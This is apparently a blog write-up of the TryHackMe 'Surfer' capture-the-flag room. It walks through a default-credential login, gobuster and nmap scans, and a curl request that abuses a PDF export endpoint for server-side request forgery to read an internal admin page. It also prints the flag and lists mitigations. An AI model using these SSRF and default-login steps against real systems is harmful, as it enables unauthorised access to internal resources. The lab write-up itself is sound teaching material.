---
title: "Surfer - SSRF (TryHackMe)"
datePublished: Fri Jan 30 2026 21:00:00 GMT+0000 (Coordinated Universal Time)
cuid: cmlibxoet000002l49eecfvh4
slug: surfer-ssrf-tryhackme
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1769800491694/ce18247e-caa7-4d73-88c9-be998f9e71ec.png
tags: curl, tryhackme, ssrf, ctf-writeup

---

**Introduction:** Web app with hidden internal pages. The challenge mentions an SSRF vulnerability. Goal: Access restricted admin functionality.

**What You Did:**

1. Login with default creds (admin/admin)
    
2. Found `export2pdf.php` endpoint that accepts URLs
    
3. Exploited SSRF by passing `url=`[`http://127.0.0.1/internal/admin.php`](http://127.0.0.1/internal/admin.php)
    
4. Server fetched the internal page and returned it as a PDF
    
5. Extracted flag from PDF
    

## Surfer

Woah, check out this radical app! Isn't it narly dude? We've been surfing through some webpages and we want to get you on board too! They said this application has some functionality that is only available for internal usage -- but if you catch the right wave, you can probably find the sweet stuff!

Access this challenge by deploying both the vulnerable machine by pressing the green "Start Machine" button located within this task, and the TryHackMe AttackBox by pressing the  "Start AttackBox" button located at the top-right of the page.

Navigate to the following URL using the AttackBox: [HTTP://MACHINE\_IP](http://machine_ip/)

Check out similar content on TryHackMe:

* [SSRF](https://tryhackme.com/room/ssrfqi)
    

### Answer the questions below

1. Uncover the flag on the hidden application page. `flag{6255c55660e292cf0116c053c9937810}`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769800334364/2a0a28f8-d04c-42c9-a660-1b0d55dd2275.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769800347852/438aff51-4a0c-41f0-a86e-0a66e000b16f.png align="center")
    
    `gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769800430213/9eefc201-a75c-48f1-9cb3-12376d13a8da.png align="center")
    
    `nmap -p- -sV <IP_Address>`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769800452312/2d7d4c21-6dbd-43c4-9892-b91df1959de7.png align="center")
    
    ```bash
    curl -c cookies.txt -d "username=admin&password=admin" http://<IP_Address>/login.php
    <!DOCTYPE html>
    <html lang="en">
    
    <head>
      <meta charset="utf-8">
      <meta content="width=device-width, initial-scale=1.0" name="viewport">
    
      <title>24X7 System+</title>
      <meta content="" name="description">
      <meta content="" name="keywords">
    
      <!-- Favicons -->
      <link href="assets/img/favicon.png" rel="icon">
      <link href="assets/img/apple-touch-icon.png" rel="apple-touch-icon">
    
      <!-- Vendor CSS Files -->
      <link href="assets/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
      <link href="assets/vendor/bootstrap-icons/bootstrap-icons.css" rel="stylesheet">
      <link href="assets/vendor/boxicons/css/boxicons.min.css" rel="stylesheet">
      <link href="assets/vendor/quill/quill.snow.css" rel="stylesheet">
      <link href="assets/vendor/quill/quill.bubble.css" rel="stylesheet">
      <link href="assets/vendor/remixicon/remixicon.css" rel="stylesheet">
      <link href="assets/vendor/simple-datatables/style.css" rel="stylesheet">
    
      <!-- Template Main CSS File -->
      <link href="assets/css/style.css" rel="stylesheet">
    
    </head>
    
    <body>
    
      <main>
        <div class="container">
    
          <section class="section register min-vh-100 d-flex flex-column align-items-center justify-content-center py-4">
            <div class="container">
              <div class="row justify-content-center">
                <div class="col-lg-4 col-md-6 d-flex flex-column align-items-center justify-content-center">
    
                  <div class="d-flex justify-content-center py-4">
                    <a href="index.php" class="logo d-flex align-items-center w-auto">
                      <img src="assets/img/logo.png" alt="">
                      <span class="d-none d-lg-block">24X7 System+</span>
                    </a>
                  </div><!-- End Logo -->
    
                  <div class="card mb-3">
    
                    <div class="card-body">
    
                      <div class="pt-4 pb-2">
                        <h5 class="card-title text-center pb-0 fs-4">Login to Your Account</h5>
                        <p class="text-center small">Enter your username & password to login</p>
                      </div>
    
                      <form class="row g-3 needs-validation" novalidate action="verify.php" method="POST">
    
                        <div class="col-12">
                          <label for="yourUsername" class="form-label">Username</label>
                          <div class="input-group has-validation">
                            <span class="input-group-text" id="inputGroupPrepend">@</span>
                            <input type="text" name="username" class="form-control" id="uname" required>
                            <div class="invalid-feedback">Please enter your username.</div>
                          </div>
                        </div>
    
                        <div class="col-12">
                          <label for="yourPassword" class="form-label">Password</label>
                          <input type="password" name="password" class="form-control" id="psw" required>
                          <div class="invalid-feedback">Please enter your password!</div>
                        </div>
                        <div class="col-12">
                          <button class="btn btn-primary w-100" type="submit">Login</button>
                        </div>
                      </form>
    
                    </div>
                  </div>
    
                  <div class="credits">
                    <!-- All the links in the footer should remain intact. -->
                    <!-- You can delete the links only if you purchased the pro version. -->
                    <!-- Licensing information: https://bootstrapmade.com/license/ -->
                    <!-- Purchase the pro version with working PHP/AJAX contact form: https://bootstrapmade.com/nice-admin-bootstrap-admin-html-template/ -->
                    <a href="https://bootstrapmade.com/"></a>
                  </div>
    
                </div>
              </div>
            </div>
    
          </section>
    
        </div>
      </main><!-- End #main -->
    
      <a href="#" class="back-to-top d-flex align-items-center justify-content-center"><i class="bi bi-arrow-up-short"></i></a>
    
      <!-- Vendor JS Files -->
      <script src="assets/vendor/apexcharts/apexcharts.min.js"></script>
      <script src="assets/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
      <script src="assets/vendor/chart.js/chart.min.js"></script>
      <script src="assets/vendor/echarts/echarts.min.js"></script>
      <script src="assets/vendor/quill/quill.min.js"></script>
      <script src="assets/vendor/simple-datatables/simple-datatables.js"></script>
      <script src="assets/vendor/tinymce/tinymce.min.js"></script>
      <script src="assets/vendor/php-email-form/validate.js"></script>
    
      <!-- Template Main JS File -->
      <script src="assets/js/main.js"></script>
    
    </body>
    </html>
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769800461605/7bcfb97f-b6b6-495f-b67f-e41df0ff7275.png align="center")
    
      
    `curl -b cookies.txt -d “url=http://127.0.0.1/internal/admin.php” http://<IP_Address>/export2pdf.php -o flag.pdf`  
      
    `strings flag.pdf | grep -i “flag\|thm”`  
      
    `pdftotext flag.pdf - | grep -i “flag\|thm”`
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769800475074/1f49b4ea-6192-44d8-a0f7-7cae6d01e8e7.png align="center")
    
    ## **Conclusion - Technical Analysis & Recommendations:**
    
    **Vulnerability:** Server-Side Request Forgery (SSRF) via unvalidated URL parameter in `export2pdf.php`.
    
    **Root Cause:** Application accepts arbitrary URLs without validating against internal/private IP ranges, allowing attackers to bypass network segmentation and access [localhost](http://localhost) resources.
    
    **Mitigation Strategies:**
    
    1. **Input Validation:** Implement strict URL allowlisting - only permit known external domains
        
    2. **IP Blacklisting:** Block requests to private IP ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16, 169.254.0.0/16)
        
    3. **Network Segmentation:** Deploy web-facing services in DMZ with no direct access to internal resources
        
    4. **Disable URL Redirects:** Prevent attackers from bypassing filters via HTTP redirects (301/302)
        
    5. **Authentication on Internal Services:** Never rely solely on network location ([localhost](http://localhost)) for security
        
    6. **Response Filtering:** Sanitize or block responses from internal IPs before returning to users
        
    
    **Additional Findings:**
    
    * Weak default credentials (admin/admin) enabled initial access
        
    * No rate limiting on PDF generation endpoint
        
    * Internal admin panel accessible via [localhost](http://localhost) without additional authentication layer
        
    
    **Defense-in-Depth:** Combine network controls, input validation, and zero-trust architecture to prevent SSRF exploitation even if one control fails.